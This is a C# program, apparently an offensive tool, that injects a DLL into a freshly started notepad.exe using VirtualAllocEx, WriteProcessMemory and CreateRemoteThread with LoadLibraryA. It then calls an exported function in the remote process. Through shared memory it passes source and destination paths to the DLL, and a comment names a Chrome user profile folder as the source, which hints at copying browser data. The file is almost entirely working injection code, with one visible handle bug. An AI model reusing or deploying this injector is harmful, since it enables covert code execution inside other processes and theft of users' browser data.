using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Advance_DLL_Injection
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct SharedData
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 260)]
            public byte[] source;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 260)]
            public byte[] destination;

            public int fileCount;
        }

        #region Importing APIS
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Optional APIs for Debugging Purpose
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetExitCodeThread(IntPtr hThread, out IntPtr lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);
        #endregion

        #region CONSTANTS
        // process privileges
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // memory rights
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        // Other Constants
        const uint INFINITE = 0xFFFFFFFF;
        #endregion

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);

            PROCESS_INFORMATION pi;

            string cmd = "notepad.exe";

            bool result = CreateProcess(null, cmd, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);

            if (!result)
            {
                Console.WriteLine("CreateProcess failed: " + Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("Process started. PID: " + pi.dwProcessId);

            Process targetProcess = null;
            Process[] processes = Process.GetProcessesByName("Notepad");

            if (processes.Length > 0)
            {
                targetProcess = processes[0];
                Console.WriteLine($"Found PID: {targetProcess.Id}");
            }
            else
            {
                Console.WriteLine("Process is not running.");
                return;
            }

            // geting the handle of the process - with required privileges
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            // searching for the address of LoadLibraryA and storing it in a pointer
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // name of the dll we want to inject
            string dllName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "DLL With Function Export.dll"); // Build DLL path in same folder
            if (!File.Exists(dllName))
                Console.WriteLine(File.Exists(dllName));

            // alocating some memory on the target process - enough to store the name of the dll
            // and storing its address in a pointer
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            Console.WriteLine("Virtual Allocation Successful");

            // writing the name of the dll there
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            Console.WriteLine("DLL Name Written");

            // creating a thread that will call LoadLibraryA with allocMemAddress as argument
            IntPtr hThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("CreateRemoteThread failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("Remote thread created");

            WaitForSingleObject(hThread, INFINITE);

            // Get base address of the injected Dll
            IntPtr remoteDllBase;
            GetExitCodeThread(hThread, out remoteDllBase);
            Console.WriteLine($"Remote DLL Base: 0x{remoteDllBase.ToInt64():X}");

            /*
             =================================================================
             =                Creating Shared Memory                         =
             =================================================================
             */

            SharedData data = new SharedData
            {
                source = ToFixedBytes(@"C:\Source\File\Path", 260), // C:\Users\OFF NET\AppData\Local\Google\Chrome\User Data\Profile 1
                destination = ToFixedBytes(@"C:\Destination\Path", 260),
                fileCount = 123
            };

            int size = Marshal.SizeOf(typeof(SharedData));
            byte[] buffer = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(data, ptr, false);
            Marshal.Copy(ptr, buffer, 0, size);
            Marshal.FreeHGlobal(ptr);

            // create shared memory
            MemoryMappedFile mmf = MemoryMappedFile.CreateOrOpen("MySharedMemory", 4096);
            Console.WriteLine("shared memory created");

            //Write data from C#
            using (var accessor = mmf.CreateViewAccessor())
            {
                //byte[] data = Encoding.ASCII.GetBytes("Hello from C#\0");
                accessor.WriteArray(0, buffer, 0, buffer.Length);
                //accessor.WriteArray(0, data, 0, data.Length);
            }
            Console.WriteLine("data wirtten to shared memory");

            /*
             =================================================================
             =                     Local Loading                             =
             =================================================================
             */


            /// injecting the dll to currnent process (localy)
            /// 

            // Get the Handle for the current process
            Process currentProcess = Process.GetCurrentProcess();
            IntPtr currentProcessHandle = currentProcess.Handle;

            // allocate memory to current process
            IntPtr allocMemAddresslocaly = VirtualAllocEx(currentProcessHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // write the dll name to the current process memory
            WriteProcessMemory(currentProcessHandle, allocMemAddresslocaly, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            // creating a thread localy that will call LoadLibraryA with allocMemAddresslocaly as argument
            IntPtr hLocalThread = CreateRemoteThread(currentProcessHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddresslocaly, 0, IntPtr.Zero);

            if (hLocalThread == IntPtr.Zero)
            {
                Console.WriteLine("CreateRemoteThread failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("Local thread created");

            WaitForSingleObject(hLocalThread, INFINITE);

            IntPtr localDllBase;
            GetExitCodeThread(hThread, out localDllBase);
            Console.WriteLine($"Local DLL Base: 0x{localDllBase.ToInt64():X}");

            // get the base address of the exported function
            IntPtr localFunctionAddress = GetProcAddress(GetModuleHandle(dllName), "MyFunction");
            Console.WriteLine($"Local Function Address: 0x{localFunctionAddress.ToInt64():X}");

            // Calculate offset
            long functionOffset = localFunctionAddress.ToInt64() - localDllBase.ToInt64(); // subtract the DLL base from the function address gives the exported funciton offset
            Console.WriteLine($"Function Offset: 0x{functionOffset:X}");

            // Add offset to the base address of the remote dll (injected dll)
            IntPtr remoteFunctionAddress = new IntPtr(remoteDllBase.ToInt64() + functionOffset);
            Console.WriteLine($"Remote Function Address: 0x{remoteFunctionAddress.ToInt64():X}");

            // CreateRemoteThread to execute the remote function.
            IntPtr remoteThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteFunctionAddress, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr exitCode123;
            WaitForSingleObject(remoteThread, INFINITE);
            GetExitCodeThread(remoteThread, out exitCode123);
            Console.WriteLine($"Thread Exit Code: 0x{exitCode123:X}");

            return;
        }

        /* ========================================
                HELPER FUNCTION
         ========================================*/
        static byte[] ToFixedBytes(string text, int size)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(text);

            byte[] buffer = new byte[size];

            int len = Math.Min(bytes.Length, size - 1);

            Array.Copy(bytes, buffer, len);

            buffer[len] = 0;

            return buffer;
        }
    }
}
